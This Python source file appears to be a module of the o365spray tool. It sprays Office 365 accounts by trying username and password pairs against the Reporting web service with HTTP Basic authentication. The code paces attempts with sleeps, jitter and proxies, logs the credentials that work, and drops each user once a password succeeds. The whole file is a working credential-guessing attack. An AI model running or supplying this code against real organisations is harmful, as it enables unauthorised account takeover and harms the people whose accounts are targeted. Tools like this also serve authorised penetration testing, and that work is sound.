#!/usr/bin/env python3

import time
import logging
from requests.auth import HTTPBasicAuth  # type: ignore
from o365spray.core.utils import text_colors
from o365spray.core.handlers.sprayer.modules.base import SprayerBase


class SprayModule_reporting(SprayerBase):
    """Reporting Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_reporting, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via the Office 365 Reporting API

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            auth = HTTPBasicAuth(email, password)
            url = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc"
            response = self._send_request(
                "get",
                url,
                auth=auth,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )
            status = response.status_code

            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                print(
                    f"[{text_colors.FAIL}INVALID{text_colors.ENDC}] "
                    f"{email}:{password}{' '*10}",
                    end="\r",
                )

        except Exception as e:
            logging.debug(e)
            pass
